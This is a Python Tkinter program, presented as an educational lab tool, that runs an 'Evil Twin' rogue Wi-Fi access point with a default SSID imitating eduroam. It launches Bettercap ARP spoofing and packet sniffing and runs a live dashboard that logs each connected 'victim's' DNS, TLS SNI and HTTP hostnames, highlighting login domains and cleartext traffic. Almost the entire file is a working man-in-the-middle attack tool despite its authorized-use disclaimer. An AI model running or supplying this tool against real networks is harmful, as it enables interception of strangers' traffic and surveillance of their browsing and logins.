#!/usr/bin/env python3
"""Evil Twin / MITM lab controller — educational research tool (Linux/Kali).

Single-file Tkinter front-end for an `hostapd` + `dhcpd` + `iptables` rogue AP
lab. Use only on networks and devices you own or are explicitly authorized to
test. Intended for studying and explaining man-in-the-middle attacks.
"""

from __future__ import annotations

import ipaddress
import os
import queue
import re
import shlex
import signal
import subprocess
import threading
import time
from dataclasses import dataclass
from pathlib import Path
import tkinter as tk
from tkinter import ttk, messagebox
from tkinter.scrolledtext import ScrolledText

# --- Paths and configuration files -----------------------------------------
APP_DIR = Path("/tmp/lab_ap_gui")
HOSTAPD_CONF = APP_DIR / "hostapd.conf"
DHCPD_CONF = APP_DIR / "dhcpd.conf"
LEASES_FILE = APP_DIR / "dhcpd.leases"
PID_DIR = APP_DIR / "pids"
HOSTAPD_PID = PID_DIR / "hostapd.pid"
DHCPD_PID = PID_DIR / "dhcpd.pid"
LOG_FILE = APP_DIR / "lab_ap.log"
PCAP_FILE = APP_DIR / "lab_capture.pcap"

# --- Dark theme palette ------------------------------------------------------
BG = "#0d1117"        # window background
BG2 = "#161b22"       # panels / inputs
BG3 = "#21262d"       # hover / selection
FG = "#c9d1d9"        # default text
MUTED = "#8b949e"     # secondary text
BORDER = "#30363d"
ACCENT = "#00ff41"    # matrix green (live / success)
BLUE = "#58a6ff"      # commands / info
RED = "#ff6b6b"       # errors
YELLOW = "#f1fa8c"    # warnings
MONO = ("Cascadia Mono", 10) if os.name == "nt" else ("monospace", 10)

# Domain categories for the live intelligence dashboard. First match wins, so
# the high-signal category (auth) is listed before the broad ones (cdn). Each
# rule is (name, colour, substring keywords matched against the hostname).
INTEL_RULES = [
    ("auth", "#ff6b6b",
     ["login", "signin", "sign-in", "accounts", "account", "oauth", "/auth",
      "auth.", "sso", "logon", "id."]),
    ("tracking", "#f1fa8c",
     ["analytic", "tracking", "telemetry", "metric", "doubleclick", "adservice",
      "ads.", "adsystem", "appsflyer", "sentry", "crashlytic", "snplow",
      "scorecard", "branch.io", "segment", "mixpanel"]),
    ("media", "#00ff41",
     ["spotify", "scdn", "youtube", "googlevideo", "discord", "netflix",
      "twitch", "music", "video", "vimeo", "soundcloud", "tiktok"]),
    ("cdn", "#8b949e",
     ["akamai", "akadns", "fastly", "cloudfront", "cloudflare", "edgekey",
      "edgesuite", "gstatic", "googleapis", "gvt1", "apple.com", "icloud",
      "aaplimg", "1e100"]),
]


class CommandError(RuntimeError):
    pass


@dataclass
class Station:
    mac: str
    ip: str
    signal: int | None
    hostname: str


@dataclass
class LabConfig:
    ssid: str
    channel: str
    ap_iface: str
    upstream_iface: str
    ap_ip: str
    cidr: str
    dhcp_last_octet: str
    dns: str

    @classmethod
    def from_strings(cls, **kw) -> "LabConfig":
        """Build a config from raw UI strings, validating at the boundary."""
        cfg = cls(**{k: v.strip() for k, v in kw.items()})
        cfg.validate()
        return cfg

    def validate(self) -> None:
        if not self.ssid:
            raise ValueError("SSID cannot be empty.")
        if not self.ap_iface or not self.upstream_iface:
            raise ValueError("AP and Internet interfaces are required.")
        try:
            ch = int(self.channel)
            if not 1 <= ch <= 196:
                raise ValueError
        except ValueError:
            raise ValueError("Channel must be an integer between 1 and 196.")
        try:
            cidr = int(self.cidr)
            if not 8 <= cidr <= 30:
                raise ValueError
        except ValueError:
            raise ValueError("CIDR must be an integer between 8 and 30.")
        try:
            ip = ipaddress.ip_address(self.ap_ip)
        except ValueError:
            raise ValueError(f"AP IP '{self.ap_ip}' is not a valid IPv4 address.")
        try:
            ipaddress.ip_address(self.dns)
        except ValueError:
            raise ValueError(f"DNS '{self.dns}' is not a valid IPv4 address.")
        net = ipaddress.ip_interface(f"{self.ap_ip}/{cidr}").network
        if ip not in net.hosts():
            raise ValueError(f"AP IP {self.ap_ip} is not a usable host in {net}.")
        try:
            last = int(self.dhcp_last_octet)
            if not 0 <= last <= 255:
                raise ValueError
        except ValueError:
            raise ValueError("DHCP end octet must be 0-255.")
        end = ipaddress.ip_address(f"{self.ap_ip.rsplit('.', 1)[0]}.{last}")
        start = ip + 1
        if end not in net.hosts() or end < start:
            raise ValueError("DHCP end octet does not yield a valid range above the AP IP.")


class LabManager:
    """Owns all root/system actions. Writes everything to LOG_FILE (single
    source of truth); the GUI tails that file, so there is no double-logging."""

    def __init__(self) -> None:
        APP_DIR.mkdir(parents=True, exist_ok=True)
        PID_DIR.mkdir(parents=True, exist_ok=True)
        LEASES_FILE.touch(exist_ok=True)
        LOG_FILE.touch(exist_ok=True)

    def clear_log(self) -> None:
        LOG_FILE.write_text("", encoding="utf-8")

    def log(self, msg: str) -> None:
        line = f"[{time.strftime('%H:%M:%S')}] {msg}"
        with LOG_FILE.open("a", encoding="utf-8") as f:
            f.write(line + "\n")

    def run(self, cmd: list[str], check: bool = True, quiet: bool = False) -> subprocess.CompletedProcess:
        if not quiet:
            self.log("$ " + " ".join(shlex.quote(c) for c in cmd))
        proc = subprocess.run(cmd, capture_output=True, text=True)
        if not quiet:
            if proc.stdout.strip():
                self.log(proc.stdout.strip())
            if proc.stderr.strip():
                self.log(proc.stderr.strip())
        if check and proc.returncode != 0:
            raise CommandError(f"Command failed: {' '.join(cmd)}")
        return proc

    def popen_to_log(self, cmd: list[str], pid_file: Path) -> None:
        self.log("$ " + " ".join(shlex.quote(c) for c in cmd))
        with LOG_FILE.open("a", encoding="utf-8") as logf:
            proc = subprocess.Popen(cmd, stdout=logf, stderr=logf, text=True, preexec_fn=os.setsid)
        pid_file.write_text(str(proc.pid), encoding="utf-8")
        time.sleep(1.5)
        if proc.poll() is not None:
            raise CommandError(f"Process exited early: {' '.join(cmd)}")

    def kill_pidfile(self, pid_file: Path) -> None:
        if not pid_file.exists():
            return
        try:
            pid = int(pid_file.read_text(encoding="utf-8").strip())
            os.killpg(os.getpgid(pid), signal.SIGTERM)
            time.sleep(0.5)
        except Exception:
            pass
        pid_file.unlink(missing_ok=True)

    @staticmethod
    def dhcp_range(ap_ip: str, cidr: int, last_octet: int) -> tuple[str, str, str, str]:
        """Return (subnet, netmask, range_start, range_end).

        range_start is the address *after* the AP IP so a client is never
        handed the gateway's own address.
        """
        net = ipaddress.ip_interface(f"{ap_ip}/{cidr}").network
        start = ipaddress.ip_address(ap_ip) + 1
        end = f"{ap_ip.rsplit('.', 1)[0]}.{last_octet}"
        return str(net.network_address), str(net.netmask), str(start), end

    def write_configs(self, cfg: LabConfig) -> None:
        HOSTAPD_CONF.write_text(
            f"interface={cfg.ap_iface}\ndriver=nl80211\nssid={cfg.ssid}\n"
            f"hw_mode=g\nchannel={cfg.channel}\nmacaddr_acl=0\n"
            f"ignore_broadcast_ssid=0\n",
            encoding="utf-8",
        )
        subnet, netmask, r_start, r_end = self.dhcp_range(
            cfg.ap_ip, int(cfg.cidr), int(cfg.dhcp_last_octet)
        )
        DHCPD_CONF.write_text(
            "default-lease-time 600;\nmax-lease-time 7200;\nauthoritative;\n\n"
            f"subnet {subnet} netmask {netmask} {{\n"
            f"  range {r_start} {r_end};\n"
            f"  option routers {cfg.ap_ip};\n"
            f"  option domain-name-servers {cfg.dns};\n}}\n",
            encoding="utf-8",
        )

    def start(self, cfg: LabConfig) -> None:
        if hasattr(os, "geteuid") and os.geteuid() != 0:
            raise CommandError("Run as root/sudo.")
        self.write_configs(cfg)
        # Pre-start cleanup reaps any leftover daemons but leaves NetworkManager
        # alone; the prep block below stops it deliberately.
        self.stop(silent=True, clear_terminal=False, restore_net=False)

        # 1. Prep environment — stop everything that competes for the radio.
        #    wpa_supplicant in particular yanks the interface out from under
        #    hostapd (INTERFACE-DISABLED / "Failed to set beacon parameters")
        #    if it keeps running, so kill it explicitly. iw reg set keeps the
        #    driver from disabling the channel over a missing reg domain.
        self.run(["nmcli", "radio", "wifi", "off"], check=False)
        self.run(["systemctl", "stop", "NetworkManager"], check=False)
        self.run(["pkill", "wpa_supplicant"], check=False)
        self.run(["rfkill", "unblock", "all"], check=False)
        self.run(["iw", "reg", "set", "US"], check=False)

        # 2. Interface setup
        self.run(["ip", "link", "set", cfg.ap_iface, "down"], check=False)
        time.sleep(0.5)
        self.run(["ip", "addr", "flush", "dev", cfg.ap_iface], check=False)
        self.run(["ip", "addr", "add", f"{cfg.ap_ip}/{cfg.cidr}", "dev", cfg.ap_iface])
        self.run(["ip", "link", "set", cfg.ap_iface, "up"])
        time.sleep(1.0)

        # 3. Launch hostapd and dhcpd
        self.popen_to_log(["hostapd", str(HOSTAPD_CONF)], HOSTAPD_PID)
        time.sleep(2.0)
        LEASES_FILE.touch(exist_ok=True)
        self.popen_to_log(
            ["dhcpd", "-4", "-f", "-d", "-cf", str(DHCPD_CONF),
             "-lf", str(LEASES_FILE), cfg.ap_iface],
            DHCPD_PID,
        )

        # 4. Routing
        self.run(["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"])
        self.run(["iptables", "-t", "nat", "-A", "POSTROUTING",
                  "-o", cfg.upstream_iface, "-j", "MASQUERADE"])
        self.log(f"LAB LIVE: SSID={cfg.ssid} on {cfg.ap_iface}")

    def stop(self, silent: bool = False, clear_terminal: bool = True,
             restore_net: bool = True) -> None:
        self.kill_pidfile(DHCPD_PID)
        self.kill_pidfile(HOSTAPD_PID)
        # Belt and suspenders: reap orphaned daemons by their config path, in
        # case a previous session was closed without Stop. Otherwise the old
        # hostapd stays bound to the radio and the next Start dies with
        # "Match already configured" / "Could not configure driver mode".
        self.run(["pkill", "-f", str(HOSTAPD_CONF)], check=False, quiet=True)
        self.run(["pkill", "-f", str(DHCPD_CONF)], check=False, quiet=True)
        self.run(["iptables", "-F"], check=False)
        self.run(["iptables", "-t", "nat", "-F"], check=False)
        if restore_net:
            self.run(["systemctl", "start", "NetworkManager"], check=False)
            self.run(["nmcli", "radio", "wifi", "on"], check=False)
        if not silent:
            self.log("Lab network dismantled.")
        if clear_terminal:
            self.clear_log()

    def list_stations(self, ap_iface: str) -> list[Station]:
        raw = self.run(["iw", "dev", ap_iface, "station", "dump"],
                       check=False, quiet=True).stdout
        leases = LEASES_FILE.read_text(encoding="utf-8", errors="ignore")
        stations: list[Station] = []
        for mac in re.findall(r"Station ([0-9a-f:]{17})", raw):
            esc = re.escape(mac)
            sig_m = re.search(esc + r".*?signal:\s+(-?\d+)", raw, re.S)
            ip_m = re.search(r"lease (\d+\.\d+\.\d+\.\d+).*?" + esc, leases, re.S)
            host_m = re.search(esc + r".*?client-hostname \"(.*?)\"", leases, re.S)
            stations.append(Station(
                mac=mac,
                ip=ip_m.group(1) if ip_m else "—",
                signal=int(sig_m.group(1)) if sig_m else None,
                hostname=host_m.group(1) if host_m else "Unknown",
            ))
        return stations

    # --- External tool launchers --------------------------------------------
    def open_wireshark(self, iface: str) -> None:
        subprocess.Popen(["wireshark", "-k", "-i", iface], stderr=subprocess.DEVNULL)
        self.log(f"Launched Wireshark on {iface}")

    def open_tcpdump(self, iface: str) -> None:
        cmd = f"qterminal -e 'tcpdump -i {iface} -v -w {PCAP_FILE}'"
        subprocess.Popen(shlex.split(cmd), stderr=subprocess.DEVNULL)
        self.log(f"Launched TCPDump. Saving to {PCAP_FILE}")

    def open_bettercap(self, iface: str, ap_ip: str, cidr: str) -> None:
        # Derive the spoof target subnet from the live config instead of
        # hardcoding it, so ARP spoofing follows whatever network you run.
        net = ipaddress.ip_interface(f"{ap_ip}/{cidr}").network
        sniff_out = APP_DIR / "bettercap_sniff.pcap"
        # net.sniff.output writes every sniffed packet to a pcap, so the session
        # is saved and re-openable in Wireshark instead of scrolling off-screen.
        # verbose still prints each event live in the terminal.
        cmds = (f"net.probe on; set arp.spoof.targets {net}; arp.spoof on; "
                f"set net.sniff.verbose true; set net.sniff.output {sniff_out}; "
                f"net.sniff on")
        cmd = f"qterminal -e 'bettercap -iface {iface} -eval \"{cmds}\"'"
        subprocess.Popen(shlex.split(cmd), stderr=subprocess.DEVNULL)
        self.log(f"Launched Bettercap MITM session on {iface} (targets {net})")
        self.log(f"Bettercap packets saving to {sniff_out}")


class LabGUI:
    REFRESH_MS = 4000  # client table auto-refresh interval

    def __init__(self, root: tk.Tk) -> None:
        self.root = root
        self.manager = LabManager()
        self.log_queue: queue.Queue[str] = queue.Queue()
        self.running = False
        self.start_time: float | None = None
        self.busy = False

        # Live intelligence (Intelligence tab) state.
        self.intel_queue: queue.Queue = queue.Queue()
        self.intel_seen: dict[str, tuple] = {}   # "TYPE:domain" -> (item_id, hits)
        self.capturing = False
        self._intel_cap = None

        root.title("MITM Lab Controller")
        root.geometry("1040x820")
        root.configure(bg=BG)
        self._init_style()
        self._build_ui()
        self._start_log_tail()
        self.root.after(100, self._drain_log)
        self.root.after(150, self._drain_intel)
        self.root.after(1000, self._tick)
        self.root.after(self.REFRESH_MS, self._auto_refresh)

    # --- Theming -------------------------------------------------------------
    def _init_style(self) -> None:
        s = ttk.Style()
        s.theme_use("clam")
        s.configure(".", background=BG, foreground=FG, fieldbackground=BG2,
                    bordercolor=BORDER, font=("Segoe UI", 10))
        s.configure("TFrame", background=BG)
        s.configure("TLabel", background=BG, foreground=FG)
        s.configure("Muted.TLabel", background=BG, foreground=MUTED)
        s.configure("TLabelframe", background=BG, bordercolor=BORDER, relief="solid")
        s.configure("TLabelframe.Label", background=BG, foreground=ACCENT,
                    font=("Segoe UI", 10, "bold"))
        s.configure("TEntry", fieldbackground=BG2, foreground=FG,
                    insertcolor=ACCENT, bordercolor=BORDER)
        s.configure("TButton", background=BG3, foreground=FG, borderwidth=0,
                    padding=(10, 6), font=("Segoe UI", 10))
        s.map("TButton", background=[("active", BORDER), ("disabled", BG2)],
              foreground=[("disabled", MUTED)])
        s.configure("Go.TButton", background="#0f5132", foreground=ACCENT,
                    font=("Segoe UI", 10, "bold"))
        s.map("Go.TButton", background=[("active", "#157347")])
        s.configure("Stop.TButton", background="#5c1f22", foreground=RED,
                    font=("Segoe UI", 10, "bold"))
        s.map("Stop.TButton", background=[("active", "#842029")])
        s.configure("Treeview", background=BG2, fieldbackground=BG2,
                    foreground=FG, rowheight=24, borderwidth=0)
        s.configure("Treeview.Heading", background=BG3, foreground=BLUE,
                    relief="flat", font=("Segoe UI", 9, "bold"))
        s.map("Treeview", background=[("selected", BG3)])
        s.configure("TNotebook", background=BG, borderwidth=0)
        s.configure("TNotebook.Tab", background=BG2, foreground=MUTED,
                    padding=(16, 7), font=("Segoe UI", 10, "bold"))
        s.map("TNotebook.Tab", background=[("selected", BG3)],
              foreground=[("selected", ACCENT)])

    # --- Layout --------------------------------------------------------------
    def _build_ui(self) -> None:
        nb = ttk.Notebook(self.root)
        nb.pack(fill="both", expand=True)
        frm = ttk.Frame(nb, padding=12)
        nb.add(frm, text="  Control  ")
        intel = ttk.Frame(nb, padding=12)
        nb.add(intel, text="  Intelligence  ")
        self._build_intel_tab(intel)

        top = ttk.LabelFrame(frm, text="1 · Setup Parameters", padding=10)
        top.pack(fill="x")

        self.vars = {
            "ssid": tk.StringVar(value="eduroam_lab"),
            "channel": tk.StringVar(value="6"),
            "ap_iface": tk.StringVar(value="wlan0"),
            "upstream_iface": tk.StringVar(value="eth0"),
            "ap_ip": tk.StringVar(value="192.168.50.1"),
            "cidr": tk.StringVar(value="24"),
            "dhcp_last_octet": tk.StringVar(value="50"),
            "dns": tk.StringVar(value="8.8.8.8"),
        }
        labels = [
            ("SSID (Fake)", "ssid"), ("Channel", "channel"),
            ("AP Interface", "ap_iface"), ("Internet Iface", "upstream_iface"),
            ("AP IP", "ap_ip"), ("CIDR", "cidr"),
            ("DHCP End", "dhcp_last_octet"), ("DNS", "dns"),
        ]
        for i, (label, key) in enumerate(labels):
            ttk.Label(top, text=label).grid(row=i // 4, column=(i % 4) * 2,
                                            sticky="w", padx=5, pady=6)
            ttk.Entry(top, textvariable=self.vars[key], width=16).grid(
                row=i // 4, column=(i % 4) * 2 + 1, sticky="w", padx=5, pady=6)

        btns = ttk.Frame(frm, padding=(0, 10))
        btns.pack(fill="x")
        self.btn_start = ttk.Button(btns, text="🚀 Start AP", style="Go.TButton",
                                    command=self.start_lab)
        self.btn_start.pack(side="left", padx=4)
        self.btn_stop = ttk.Button(btns, text="🛑 Stop AP", style="Stop.TButton",
                                   command=self.stop_lab)
        self.btn_stop.pack(side="left", padx=4)
        ttk.Button(btns, text="📡 Refresh Clients",
                   command=self.refresh_clients).pack(side="left", padx=4)

        # --- Status strip ---
        status = ttk.Frame(frm)
        status.pack(fill="x", pady=(0, 8))
        self.led = tk.Canvas(status, width=14, height=14, bg=BG, highlightthickness=0)
        self.led.pack(side="left", padx=(2, 6))
        self._led_dot = self.led.create_oval(2, 2, 12, 12, fill=RED, outline="")
        self.state_lbl = ttk.Label(status, text="OFFLINE", style="Muted.TLabel")
        self.state_lbl.pack(side="left")
        self.stat_lbl = ttk.Label(status, text="0 clients · up 00:00:00",
                                  style="Muted.TLabel")
        self.stat_lbl.pack(side="right")

        # --- Client table ---
        clients = ttk.LabelFrame(frm, text="2 · Connected Clients", padding=8)
        clients.pack(fill="x")
        cols = ("mac", "ip", "signal", "bars", "host")
        self.tree = ttk.Treeview(clients, columns=cols, show="headings", height=6)
        for col, text, w in [("mac", "MAC Address", 160), ("ip", "IP", 130),
                             ("signal", "Signal", 90), ("bars", "Strength", 90),
                             ("host", "Device Name", 240)]:
            self.tree.heading(col, text=text)
            self.tree.column(col, width=w, anchor="w")
        self.tree.tag_configure("good", foreground=ACCENT)
        self.tree.tag_configure("ok", foreground=YELLOW)
        self.tree.tag_configure("weak", foreground=RED)
        self.tree.pack(fill="x")

        # --- MITM tools ---
        tools = ttk.LabelFrame(frm, text="3 · MITM Tools", padding=10)
        tools.pack(fill="x", pady=8)
        ttk.Button(tools, text="🔍 Wireshark",
                   command=lambda: self._launch(self.manager.open_wireshark,
                                                self.vars["ap_iface"].get())).pack(side="left", padx=4)
        ttk.Button(tools, text="📦 TCPDump",
                   command=lambda: self._launch(self.manager.open_tcpdump,
                                                self.vars["ap_iface"].get())).pack(side="left", padx=4)
        ttk.Button(tools, text="⚡ Bettercap (ARP)",
                   command=lambda: self._launch(self.manager.open_bettercap,
                                                self.vars["ap_iface"].get(),
                                                self.vars["ap_ip"].get(),
                                                self.vars["cidr"].get())).pack(side="left", padx=4)
        ttk.Button(tools, text="🧹 Clear Log",
                   command=self.clear_output).pack(side="right", padx=4)

        # --- Log console ---
        self.output = ScrolledText(frm, wrap="word", height=22, bg="#0a0e12",
                                   fg=ACCENT, insertbackground=ACCENT,
                                   font=MONO, relief="flat", borderwidth=8)
        self.output.pack(fill="both", expand=True, pady=(4, 0))
        self.output.tag_configure("cmd", foreground=BLUE)
        self.output.tag_configure("err", foreground=RED)
        self.output.tag_configure("ok", foreground=ACCENT)
        self.output.tag_configure("warn", foreground=YELLOW)
        self.output.tag_configure("default", foreground=FG)
        self.output.configure(state="disabled")

    # --- Log pipeline (file -> queue -> console) -----------------------------
    def _start_log_tail(self) -> None:
        def tail_loop():
            last_size = 0
            while True:
                try:
                    if LOG_FILE.exists():
                        size = LOG_FILE.stat().st_size
                        if size < last_size:      # file was cleared
                            last_size = 0
                        if size > last_size:
                            with LOG_FILE.open("r", encoding="utf-8", errors="ignore") as f:
                                f.seek(last_size)
                                data = f.read()
                                last_size = f.tell()
                            for line in data.splitlines():
                                self.log_queue.put(line)
                except Exception:
                    pass
                time.sleep(0.2)
        threading.Thread(target=tail_loop, daemon=True).start()

    def _drain_log(self) -> None:
        wrote = False
        try:
            while True:
                self._render_line(self.log_queue.get_nowait())
                wrote = True
        except queue.Empty:
            pass
        if wrote:
            self.output.see("end")
        self.root.after(100, self._drain_log)

    def _render_line(self, line: str) -> None:
        low = line.lower()
        if any(k in low for k in ("fail", "error", "denied", "exited early")):
            tag = "err"
        elif "lab live" in low or "success" in low:
            tag = "ok"
        elif line.lstrip().startswith("[") and "] $" in line:
            tag = "cmd"
        elif "warn" in low or "dismantled" in low:
            tag = "warn"
        else:
            tag = "default"
        self.output.configure(state="normal")
        self.output.insert("end", line + "\n", tag)
        self.output.configure(state="disabled")

    # --- Worker-thread actions (keep the UI responsive) ----------------------
    def _set_busy(self, busy: bool) -> None:
        self.busy = busy
        state = "disabled" if busy else "normal"
        self.btn_start.configure(state=state)
        self.btn_stop.configure(state=state)

    def start_lab(self) -> None:
        if self.busy:
            return
        try:
            cfg = LabConfig.from_strings(**{k: v.get() for k, v in self.vars.items()})
        except ValueError as e:
            messagebox.showerror("Invalid configuration", str(e))
            return
        self._set_busy(True)
        self.state_lbl.configure(text="STARTING…")

        def work():
            try:
                self.manager.start(cfg)
                self.root.after(0, lambda: self._on_started(cfg.ssid))
            except Exception as e:
                self.root.after(0, lambda: self._on_error(str(e)))
        threading.Thread(target=work, daemon=True).start()

    def _on_started(self, ssid: str) -> None:
        self.running = True
        self.start_time = time.time()
        self.led.itemconfig(self._led_dot, fill=ACCENT)
        self.state_lbl.configure(text="● LIVE")
        self._set_busy(False)
        messagebox.showinfo("Success", f"Evil Twin '{ssid}' is live!")

    def _on_error(self, msg: str) -> None:
        self.state_lbl.configure(text="OFFLINE")
        self._set_busy(False)
        messagebox.showerror("Error", msg)

    def stop_lab(self) -> None:
        if self.busy:
            return
        self._set_busy(True)
        self.state_lbl.configure(text="STOPPING…")

        def work():
            self.manager.stop()
            self.root.after(0, self._on_stopped)
        threading.Thread(target=work, daemon=True).start()

    def _on_stopped(self) -> None:
        self.running = False
        self.start_time = None
        self.led.itemconfig(self._led_dot, fill=RED)
        self.state_lbl.configure(text="OFFLINE")
        self.tree.delete(*self.tree.get_children())
        self._set_busy(False)
        messagebox.showinfo("Stopped", "Network state restored.")

    def _launch(self, fn, *args) -> None:
        try:
            fn(*args)
        except Exception as e:
            messagebox.showerror("Launch failed", str(e))

    # --- Client table + status strip -----------------------------------------
    @staticmethod
    def _bars(dbm: int | None) -> tuple[str, str]:
        if dbm is None:
            return "····", "weak"
        level = max(0, min(4, (dbm + 95) // 15))  # ~-95→0 .. -35→4
        tag = "good" if level >= 3 else "ok" if level == 2 else "weak"
        return ("█" * level + "·" * (4 - level)), tag

    def refresh_clients(self) -> None:
        if not self.running:
            return

        def work():
            try:
                stations = self.manager.list_stations(self.vars["ap_iface"].get())
            except Exception:
                stations = []
            self.root.after(0, lambda: self._render_clients(stations))
        threading.Thread(target=work, daemon=True).start()

    def _render_clients(self, stations: list[Station]) -> None:
        self.tree.delete(*self.tree.get_children())
        for st in stations:
            bars, tag = self._bars(st.signal)
            sig = f"{st.signal} dBm" if st.signal is not None else "—"
            self.tree.insert("", "end", tags=(tag,),
                             values=(st.mac, st.ip, sig, bars, st.hostname))
        self.client_count = len(stations)

    client_count = 0

    def _auto_refresh(self) -> None:
        if self.running and not self.busy:
            self.refresh_clients()
        self.root.after(self.REFRESH_MS, self._auto_refresh)

    def _tick(self) -> None:
        if self.running and self.start_time:
            up = int(time.time() - self.start_time)
            clock = f"{up // 3600:02d}:{up % 3600 // 60:02d}:{up % 60:02d}"
            self.stat_lbl.configure(text=f"{self.client_count} clients · up {clock}")
        else:
            self.stat_lbl.configure(text="0 clients · up 00:00:00")
        self.root.after(1000, self._tick)

    # --- Intelligence tab: live DNS / TLS-SNI / HTTP metadata ----------------
    def _build_intel_tab(self, parent: ttk.Frame) -> None:
        bar = ttk.Frame(parent)
        bar.pack(fill="x")
        self.btn_capture = ttk.Button(bar, text="🛰 Start Capture",
                                      style="Go.TButton", command=self.toggle_capture)
        self.btn_capture.pack(side="left", padx=4)
        ttk.Button(bar, text="🧹 Clear", command=self.clear_intel).pack(side="left", padx=4)
        self.intel_stat = ttk.Label(bar, style="Muted.TLabel",
                                    text="idle · 0 domains · 0 auth · 0 cleartext")
        self.intel_stat.pack(side="right")

        legend = ttk.Frame(parent)
        legend.pack(fill="x", pady=(6, 4))
        for cat, color, _ in INTEL_RULES:
            tk.Label(legend, text=f"● {cat}", fg=color, bg=BG).pack(side="left", padx=6)
        tk.Label(legend, text="● other", fg=BLUE, bg=BG).pack(side="left", padx=6)

        wrap = ttk.LabelFrame(parent, text="Live Metadata  (DNS · TLS SNI · HTTP)",
                              padding=6)
        wrap.pack(fill="both", expand=True)
        cols = ("time", "victim", "type", "cat", "hits", "domain")
        self.itree = ttk.Treeview(wrap, columns=cols, show="headings")
        for col, text, w in [("time", "Last seen", 90), ("victim", "Victim", 130),
                             ("type", "Type", 60), ("cat", "Category", 100),
                             ("hits", "Hits", 55), ("domain", "Domain / Hostname", 430)]:
            self.itree.heading(col, text=text)
            self.itree.column(col, width=w, anchor="w")
        for cat, color, _ in INTEL_RULES:
            self.itree.tag_configure(cat, foreground=color)
        self.itree.tag_configure("other", foreground=BLUE)
        self.itree.pack(fill="both", expand=True)

        ttk.Label(parent, style="Muted.TLabel", text=(
            "Sniffs the AP interface and surfaces metadata. Modern traffic is "
            "HTTPS, so this shows which hosts the victim contacts (DNS + TLS SNI), "
            "not content. Needs: apt install tshark · pip install pyshark")
        ).pack(fill="x", pady=(6, 0))

    def toggle_capture(self) -> None:
        self.stop_capture() if self.capturing else self.start_capture()

    def start_capture(self) -> None:
        iface = self.vars["ap_iface"].get().strip()
        self.capturing = True
        self.btn_capture.configure(text="🛑 Stop Capture", style="Stop.TButton")
        self.intel_stat.configure(text=f"capturing on {iface} …")
        threading.Thread(target=self._capture_loop, args=(iface,), daemon=True).start()

    def stop_capture(self) -> None:
        self.capturing = False
        cap = self._intel_cap
        if cap is not None:
            try:
                cap.close()
            except Exception:
                pass
        self.btn_capture.configure(text="🛰 Start Capture", style="Go.TButton")

    def _capture_loop(self, iface: str) -> None:
        try:
            import asyncio
            import pyshark
        except Exception as e:  # pyshark / tshark not installed
            self.intel_queue.put(("__error__", f"pyshark or tshark missing: {e}"))
            self.root.after(0, self._on_capture_stopped)
            return
        try:
            asyncio.set_event_loop(asyncio.new_event_loop())
            cap = pyshark.LiveCapture(
                interface=iface,
                bpf_filter="udp port 53 or tcp port 443 or tcp port 80",
            )
            self._intel_cap = cap
            for pkt in cap.sniff_continuously():
                if not self.capturing:
                    break
                item = self._extract_intel(pkt)
                if item:
                    self.intel_queue.put(item)
        except Exception as e:
            self.intel_queue.put(("__error__", str(e)))
        finally:
            self._intel_cap = None
            self.root.after(0, self._on_capture_stopped)

    def _on_capture_stopped(self) -> None:
        self.capturing = False
        self.btn_capture.configure(text="🛰 Start Capture", style="Go.TButton")
        self._update_intel_stat()

    @staticmethod
    def _extract_intel(pkt):
        try:
            names = {layer.layer_name for layer in pkt.layers}
            ts = time.strftime("%H:%M:%S", time.localtime(float(pkt.sniff_timestamp)))
            src = pkt.ip.src if "ip" in names else "?"
            if "dns" in names and hasattr(pkt.dns, "qry_name"):
                return (ts, src, "DNS", pkt.dns.qry_name)
            for lname in ("tls", "ssl"):
                if lname in names:
                    sni = getattr(getattr(pkt, lname),
                                  "handshake_extensions_server_name", None)
                    if sni:
                        return (ts, src, "SNI", sni)
            if "http" in names and hasattr(pkt.http, "host"):
                return (ts, src, "HTTP", pkt.http.host)
        except Exception:
            return None
        return None

    @staticmethod
    def _categorize(domain: str) -> str:
        d = domain.lower()
        for cat, _color, keys in INTEL_RULES:
            if any(k in d for k in keys):
                return cat
        return "other"

    def _drain_intel(self) -> None:
        try:
            while True:
                item = self.intel_queue.get_nowait()
                if item[0] == "__error__":
                    self.intel_stat.configure(text=f"error: {item[1][:70]}")
                    continue
                self._render_intel(item)
        except queue.Empty:
            pass
        self.root.after(150, self._drain_intel)

    def _render_intel(self, item) -> None:
        ts, src, kind, domain = item
        domain = domain.rstrip(".")
        cat = self._categorize(domain)
        key = f"{kind}:{domain}"
        if key in self.intel_seen:
            iid, hits = self.intel_seen[key]
            hits += 1
            self.intel_seen[key] = (iid, hits)
            self.itree.set(iid, "time", ts)
            self.itree.set(iid, "hits", hits)
        else:
            iid = self.itree.insert("", 0, tags=(cat,),
                                    values=(ts, src, kind, cat, 1, domain))
            self.intel_seen[key] = (iid, 1)
        self._update_intel_stat()

    def _update_intel_stat(self) -> None:
        total = len(self.intel_seen)
        auth = sum(1 for k in self.intel_seen
                   if self._categorize(k.split(":", 1)[1]) == "auth")
        clear = sum(1 for k in self.intel_seen if k.startswith("HTTP:"))
        state = "capturing" if self.capturing else "stopped" if total else "idle"
        self.intel_stat.configure(
            text=f"{state} · {total} domains · {auth} auth · {clear} cleartext")

    def clear_intel(self) -> None:
        self.itree.delete(*self.itree.get_children())
        self.intel_seen.clear()
        self._update_intel_stat()

    def clear_output(self) -> None:
        self.output.configure(state="normal")
        self.output.delete("1.0", "end")
        self.output.configure(state="disabled")
        self.manager.clear_log()


if __name__ == "__main__":
    root = tk.Tk()
    LabGUI(root)
    root.mainloop()
